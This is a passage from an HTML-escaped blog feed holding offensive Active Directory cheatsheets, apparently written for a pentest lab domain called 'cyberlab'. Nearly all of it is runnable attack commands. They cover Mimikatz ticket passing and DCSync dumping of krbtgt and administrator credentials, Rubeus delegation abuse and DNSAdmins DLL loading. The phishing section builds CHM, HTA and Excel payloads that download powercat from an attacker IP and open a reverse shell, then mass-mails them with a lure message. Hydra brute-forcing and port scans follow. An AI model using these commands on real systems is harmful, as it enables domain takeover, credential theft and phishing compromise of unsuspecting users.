&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt TGS_Administrator@cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ldap~cyberlab-dc.cyberlab.cybercorp.local@CYBERLAB.CYBERCORP.LOCAL_ALT.kirbi&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>If we have a ticket for the LDAP service it is possible to perform a DCSync:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\krbtgt&amp;#34;&amp;#39;&lt;/span>&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\administrator&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>The same procedure can also be performed by using &lt;code>Rubeus&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Using asktgt from Rubeus, we request a TGT as the abused account (in this case a machine account):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Rubeus&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">asktgt&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="nb">cyberlab-adminsrv&lt;/span>&lt;span class="p">$&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">CYBERLAB&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">CYBERCORP&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">LOCAL&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">rc4&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">1fadb1b13edbc5a61cbdc389e6f34c67&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">outfile&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">deleg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Using s4u from Rubeus (no SNAME validation) it is possible to ask for a TGS also for &lt;em>time&lt;/em> and &lt;em>ldap&lt;/em> services (remember to include in the &lt;em>altservice&lt;/em> field also the first service):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Rubeus&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">Rubeus&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">s4u&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ticket&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">deleg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">kirbi&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">impersonateuser&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">administrator&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">msdsspn&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">cifs&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">altservice&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">cifs&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">time&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ldap&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">wsman&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">rpcss&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">ptt&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>An alternative in case of SYSTEM level compromise of a machine with constrained delegation enabled:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Impersonate the Administrator account:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="no">Reflection.Assembly&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">LoadWithPartialName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;System.IdentityModel&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">out-null&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$idToImpersonate&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Security&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Principal&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">WindowsIdentity&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$idToImpersonate&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Impersonate&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="no">System.Security.Principal.WindowsIdentity&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">GetCurrent&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Try to access the service (in case the COMPUTER1 is allowed to delegate to DC CIFS service):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="dnsadmin">DNSAdmin&lt;/h2>
&lt;p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of &lt;em>dns.exe&lt;/em> (SYSTEM). In case the DC also serves as DNS, this will provide us escalation to DA. Privileges to restart the DNS service are needed.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Enumerate the members of the DNSAdmis group&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;DNSAdmins&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;DNSAdmins&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we know the members of the DNSAdmins group, we need to compromise a member.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Install DNS RSAT tools (if not present):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WindowsCapability&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">RSAT&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="n">-Online&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Add-WindowsCapability&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">Online&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># RSAT DNS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dnscmd&lt;/span> &lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">config&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">serverlevelplugindll&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">FILESERVER_IP&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">dll&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">mimilib&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">dll&lt;/span> &lt;span class="c"># Absolute path&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or using DNSServer module (needs RSAT DNS):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># RSAT DNS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$dnsettings&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-DnsServerSetting&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-All&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$dnsettings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ServerLevelPluginDll&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;\\FILESERVER_IP\dll\mimilib.dll&amp;#34;&lt;/span> &lt;span class="c"># Absolute path&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DnsServerSetting&lt;/span> &lt;span class="n">-InputObject&lt;/span> &lt;span class="nv">$dnsettings&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>From a CMD shell restart the DNS service (assuming that the DNSAdmins group has the permission to do so):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">sc &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="n">dns&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">sc &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="nb">start &lt;/span>&lt;span class="n">dns&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>By default, the mimilib.dll logs all DNS queries to &lt;strong>C:\Windows\System32\kiwidns.log&lt;/strong>&lt;/p>
&lt;p>If you want to implement a custom DLL to perform custom actions (i.e. add a user to the Administrators group), it is possible to use the template present at this link &lt;a href="https://github.com/kazkansouh/DNSAdmin-DLL" target="_blank" rel="noopener">DNSAdmin-DLL&lt;/a>. In fact, the DLL must export predefined functions to be accepted by the DNS service.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="phishing">Phishing&lt;/h2>
&lt;p>In order to perform a phishing attack it is necessary to perform the following steps:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Find the mail server by looking at SMTP open ports (25, 587, 465):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="mf">25&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">587&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">465&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="n">smtp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="nv">$_&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-d&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Generate a malicious attachment to be sent within the mail message:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-CHM&lt;/span> &lt;span class="n">-PayloadScript&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Invoke-PowerShellTcp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-HHCPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Program Files (x86)\HTML Help Workshop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-CHM&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat_connect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-HHCPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Program Files (x86)\HTML Help Workshop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-CHM&lt;/span> &lt;span class="n">-Payload&lt;/span> &lt;span class="s2">&amp;#34;-c net localgroup administrators CYBERLAB\STUDENT01 /add&amp;#34;&lt;/span> &lt;span class="n">-HHCPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Program Files (x86)\HTML Help Workshop&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-Excel&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat_connect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-DDE&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-HTA&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat_connect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-HTA&lt;/span> &lt;span class="n">-Payload&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c . \\10.10.10.10\tmp\powercat.ps1; powercat -c ws01 -p 443 -e cmd&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-HTA&lt;/span> &lt;span class="n">-Payload&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c net localgroup administrators cyberlab\student01 /add&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Connect to the SMTP server and the send the message to the recipients:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># phishing.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$recipients&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;lbunce@cyberlab.local&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;bschonfelder@cyberlab.local&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sender&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;giovanni@pecoraro.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$subject&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Important mail&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$body&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Please open the attachment&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$smtp_server&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;smtp.cyberlab.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$smtp_port&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">25&lt;/span>&lt;span class="nv">$attachment_path&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;.\doc.chm&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">Foreach&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$rcpt&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="nv">$recipients&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="n">-ForegroundColor&lt;/span> &lt;span class="n">Yellow&lt;/span> &lt;span class="s2">&amp;#34;Sending phishing email to &lt;/span>&lt;span class="nv">$rcpt&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Send-MailMessage&lt;/span> &lt;span class="n">-To&lt;/span> &lt;span class="nv">$rcpt&lt;/span> &lt;span class="n">-From&lt;/span> &lt;span class="nv">$sender&lt;/span> &lt;span class="n">-Subject&lt;/span> &lt;span class="nv">$subject&lt;/span> &lt;span class="n">-Body&lt;/span> &lt;span class="nv">$body&lt;/span> &lt;span class="n">-SmtpServer&lt;/span> &lt;span class="nv">$smtp_server&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="nv">$smtp_port&lt;/span> &lt;span class="n">-Attachments&lt;/span> &lt;span class="nv">$attachment_path&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="brute-forcing">Brute-forcing&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># hydra.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">hydra&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-L&lt;/span> &lt;span class="p">..\&lt;/span>&lt;span class="n">usernames&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="n">-P&lt;/span> &lt;span class="p">..\&lt;/span>&lt;span class="mf">500&lt;/span>&lt;span class="n">-worst-passwords&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="s2">&amp;#34;http-post-form://192.168.2.50:8080/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^&amp;amp;from=%2FasynchPeople%2F&amp;amp;Submit=Sign+in:Invalid&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>Domain Lateral Movement cheatsheet</title><link>https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/</link><pubDate>Sun, 24 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0010-domain-lateral-movement-cheatsheet/</guid><description>&lt;h2 id="local-files">Local Files&lt;/h2>
&lt;p>Find local senstive files on computers:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ChildItem&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*.&lt;/span>&lt;span class="n">xml&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-RecurseGet-ChildItem&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">unattend&lt;/span>&lt;span class="p">*.&lt;/span>&lt;span class="n">xml&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-Recurse&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="applocker">AppLocker&lt;/h2>
&lt;p>Identify AppLocker policy. Look for exempted binaries or paths to bypass. Look at &lt;a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS&lt;/a> if only signed binaries are allowed:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-AppLockerPolicy&lt;/span> &lt;span class="n">-Effective&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">RuleCollections&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="port-scanning">Port Scanning&lt;/h2>
&lt;p>Check machine reachability:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Test-NetConnection&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="mf">3389&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Perform a port scanning:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerSploit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Open and filtered ports&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-TopPorts&lt;/span> &lt;span class="mf">200&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">openPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- FILTERED ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">filteredPorts&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;------------&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Portscan&lt;/span> &lt;span class="n">-Hosts&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;COMPUTER2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Ports&lt;/span> &lt;span class="s2">&amp;#34;21,22,23,25,53,69,71,80,88,98,110,139,111,389,443,445,465,587,1080,1433,2001,2049,3001,3128,5222,6667,6868,7777,7878,8080,1521,3306,3389,5801,5900,5555,5901&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Hostname&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;--- OPEN ---&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span 